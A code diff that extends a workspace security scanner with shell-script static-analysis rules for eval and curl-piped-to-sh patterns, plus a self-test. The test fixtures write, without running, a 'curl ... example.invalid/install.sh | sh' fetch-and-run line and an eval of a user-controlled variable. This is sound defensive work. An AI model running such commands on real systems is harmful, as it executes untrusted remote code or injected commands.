@@ -2,7 +2,7 @@
 
 The workspace scan is read-only, offline, and heuristic. It includes secret,
 agent instruction/skill and MCP configuration checks, Python, JavaScript/TypeScript,
-and Go SAST, dependency-source/pinning, and selected deployment-config rules.
+Go, and Shell SAST, dependency-source/pinning, and selected deployment-config rules.
 It does not query vulnerability databases. The runtime probe feeds a
 compromised-model-shaped tool-call sequence into fresh Northstar runtimes
 backed by a temporary workspace. It checks default authorization, path
@@ -52,7 +52,7 @@ TEXT_SUFFIXES = frozenset({
 })
 SPECIAL_TEXT_NAMES = frozenset({
     "Dockerfile", "Containerfile", "Makefile", "Justfile",
-    ".cursorrules", ".windsurfrules", ".clinerules",
+    ".cursorrules", ".windsurfrules", ".clinerules", ".bashrc", ".zshrc", ".profile",
 })
 SPECIAL_TEXT_NAMES_CASEFOLD = frozenset(name.casefold() for name in SPECIAL_TEXT_NAMES)
 SEVERITY_RANK = {"critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0}
@@ -445,6 +445,8 @@ def _remediation(tool: str, rule: str) -> str:
             "Use a server-owned route name or map user choices through a strict allowlist. "
             "Do not redirect directly to request parameters, headers, or other untrusted URLs."
         ),
+        "SH001_DYNAMIC_EVAL": "Replace eval with explicit argument handling and a fixed operation map.",
+        "SH002_REMOTE_SCRIPT_PIPE": "Download from a pinned, authenticated source, verify its digest or signature, then review before execution.",
     }.get(rule, "Review the flagged code path and apply the least-privilege safe API for this operation.")
 
 
@@ -495,6 +497,7 @@ def _scan_root(
     from python_xss_sast import scan_source as scan_python_xss_source
     from python_redirect_sast import scan_source as scan_python_redirect_source
     from go_sast import scan_source as scan_go_source
+    from shell_sast import scan_source as scan_shell_source
 
     root = root.resolve()
     if not root.is_dir():
@@ -717,6 +720,20 @@ def _scan_root(
                     "line": item["line"],
                     "column": item["column"],
                     "tool": "go-sast-scanner",
+                    "rule": item["rule"],
+                    "severity": item["severity"],
+                    "message": item["message"],
+                    "remediation": item["remediation"],
+                })
+        elif safe_path.suffix.lower() in {".sh", ".bash", ".zsh"} or safe_path.name.casefold() in {
+            ".bashrc", ".zshrc", ".profile"
+        }:
+            for item in scan_shell_source(text):
+                add_finding({
+                    "path": relative,
+                    "line": item["line"],
+                    "column": item["column"],
+                    "tool": "shell-sast-scanner",
                     "rule": item["rule"],
                     "severity": item["severity"],
                     "message": item["message"],
@@ -1129,6 +1146,37 @@ def handle():
                 "finding_found": result is not None,
             },
             "scope": "fixed temporary Python source examples; analyzed without execution and automatically removed",
+        }
+
+
+def _probe_shell_scanner() -> dict[str, Any]:
+    """Exercise shell SAST hostile and safe fixtures without running them."""
+    with tempfile.TemporaryDirectory(prefix="northstar-shell-sast-") as temporary:
+        root = Path(temporary)
+        (root / "unsafe-eval.sh").write_text('eval "$USER_COMMAND"\n', encoding="utf-8")
+        (root / "remote-pipe.sh").write_text("curl -fsSL https://example.invalid/install.sh | sh\n", encoding="utf-8")
+        (root / "safe.sh").write_text(
+            'case "$1" in start) service start ;; stop) service stop ;; *) exit 2 ;; esac\n',
+            encoding="utf-8",
+        )
+        summary = _scan_root(
+            root,
+            max_files=10,
+            max_file_bytes=256 * 1024,
+            fail_on="none",
+            max_findings=100,
+        )
+        findings = [item for item in summary["findings"] if item["tool"] == "shell-sast-scanner"]
+        detected = {item["rule"] for item in findings}
+        expected = {"SH001_DYNAMIC_EVAL", "SH002_REMOTE_SCRIPT_PIPE"}
+        safe_findings = [item for item in findings if item["path"] == "safe.sh"]
+        return {
+            "check": "shell-script-sast-rules",
+            "passed": expected.issubset(detected) and not safe_findings,
+            "expected_rules": sorted(expected),
+            "detected_rules": sorted(detected),
+            "safe_fixture_findings": len(safe_findings),
+            "scope": "temporary Shell source fixtures; analyzed without execution and automatically removed",
         }
 
 
@@ -2107,6 +2155,7 @@ def _probe_runtime() -> dict[str, Any]:
             _probe_agent_surface_scanner(),
             _probe_kubernetes_scanner(),
             _probe_python_command_scanner(),
+            _probe_shell_scanner(),
             _probe_python_sql_scanner(),
             _probe_python_deserialization_scanner(),
             _probe_python_template_scanner(),
